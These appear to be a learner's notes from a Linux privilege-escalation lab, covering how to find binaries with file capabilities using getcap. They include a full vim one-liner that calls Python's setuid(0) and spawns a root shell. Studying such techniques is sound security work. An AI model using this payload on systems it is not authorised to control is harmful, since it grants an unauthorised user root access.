Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”.

**We can use the `getcap` tool to list enabled capabilities.**
![[linux_privesc57.png]]
   - When run as an unprivileged user, `getcap -r /` will generate a huge amount of errors, so it is good practice to redirect the error messages to /dev/null.

**Please note that neither vim nor its copy has the SUID bit set. This privilege escalation vector is therefore not discoverable when enumerating files looking for SUID.**
![[linux_privesc58.png]]

**We notice that vim can be used with the following command and payload:**
```sh
/home/karen/vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

![[linux_privesc59.png]]

**This will launch a root shell as seen below;**
![[linux_privesc60.png]]
